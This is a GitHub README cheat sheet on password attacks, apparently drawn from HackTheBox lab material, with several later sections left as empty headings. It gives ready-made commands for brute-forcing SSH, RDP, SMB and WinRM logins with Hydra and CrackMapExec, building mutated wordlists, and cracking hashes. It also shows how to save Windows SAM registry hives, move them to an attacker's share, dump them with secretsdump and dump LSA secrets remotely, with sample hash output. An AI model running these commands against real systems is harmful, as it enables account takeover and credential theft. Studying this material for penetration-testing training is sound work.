<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" height="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/Password-Attacks">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/Password-Attacks">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>


# PASSWORD ATTACKS
Password attacks are a common and critical aspect of cybersecurity, and they come in various forms. Here's an overview of the most widely known types of password attacks:

## Authentication
* Something you know (a password, passcode, pin, etc.).
* Something you have (an ID Card, security key, or other MFA tools).
* Something you are (your physical self, username, email address, or other identifiers.)

# Credential Storage
## 1. Linux
```
// password list
cat /etc/shadow
y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::


// uername list
cat /etc/passwd
...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```


## 2.Windows Authentication Process
Windows Authentication Process Diagram


<h1 align="center">
  <img src="/img/1.webp" alt="" height="500px;">
</h1>

### LSASS
Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe.


### SAM Database
User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM

Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in %SystemRoot%\ntds.dit.


### SYSKEY
Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.



### Credential Manager

<h1 align="center">
  <img src="/img/2.webp" alt="" height="500px;">
</h1>


### NTDS
NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

* User accounts (username & password hash)
* Group accounts
* Computer accounts
* Group policy objects


## John The Ripper

## Attack Methods
* Dictionary Attacks
* Brute Force Attacks
* Rainbow Table Attacks


## Cracking Modes
Single Crack Mode is one of the most common John modes used when attempting to crack passwords using a single password list
* Single Crack Mode
```
john --format=<hash_type> <hash or hash_file>
```

* Wordlist Mode
```
john --wordlist=<wordlist_file> --rules <hash_file>
```

* Incremental Mode
```
john --incremental <hash_file>
```


# Remote Password Attacks
* Network Services
* Password Mutations
* Password Reuse / Default Passwords

## 1.Network Services
```
FTP	SMB	NFS
IMAP/POP3	SSH	MySQL/MSSQL
RDP	WinRM	VNC
Telnet	SMTP	LDAP
```
* WinRM
* SSH
* Remote Desktop Protocol (RDP)
* SMB

### 1.WinRM
Windows Remote Management (WinRM) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management). It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM).

* WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).

#### CrackMapExec
```
sudo apt-get -y install crackmapexec
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

#### Evil-WinRM
```
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

### 2.SSH
Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.

#### Hydra - SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```

### 3.Remote Desktop Protocol (RDP)
Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.

### Hydra - RDP
```
 hydra -L user.list -P password.list rdp://10.129.42.197
 ```

 ### xFreeRDP
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

###  4.SMB
Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.
SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. 

### Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```

### Metasploit Framework
### CrackMapExec
Now we can use CrackMapExec again to view the available shares and what privileges we have for them.
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

### Smbclient
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

## 2.Password Mutations
We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 

## Generating Rule-based Wordlist
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
ls /usr/share/hashcat/rules/
```

## Generating Wordlists Using CeWL
We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list
```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## 3.Password Reuse / Default Passwords
In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO) 

### Credential Stuffing
```
https://github.com/ihebski/DefaultCreds-cheat-sheet
https://www.softwaretestinghelp.com/default-router-username-and-password-list/
```

### Credential Stuffing - Hydra Syntax
(username:password) format:
```
hydra -C <user_pass.list> <protocol>://<IP>
```

========================================================


# Windows Local Password Attacks
## 1. Attacking SAM
Copying SAM Registry Hives
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Creating a Share with smbserver.py
All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents).
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Moving Hive Copies to Share
```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

### Dumping Hashes with Impacket's secretsdump.py
```
locate secretsdump 
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking Hashes with Hashcat
```
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

### Running Hashcat against NT Hashes
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Dumping LSA Secrets Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### Dumping SAM Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

## 2.Attacking LSASS

## 3.Attacking Active Directory & NTDS.dit

## 4.Credential Hunting in Windows


===============================================

# Linux Local Password Attacks

## 1. Credential Hunting in Linux
## 2. Passwd, Shadow & Opasswd


=================================================


# Windows Lateral Movement
## 1. Pass the Hash (PtH)
## 2. Pass the Ticket (PtT) from Windows
## 3. Pass the Ticket (PtT) from Linux

=================================================

# Cracking Files
## 1. Protected Files
## 2. Protected Archives

===============================================

# Password Management
## 1. Password Policies
## 2. Password Managers



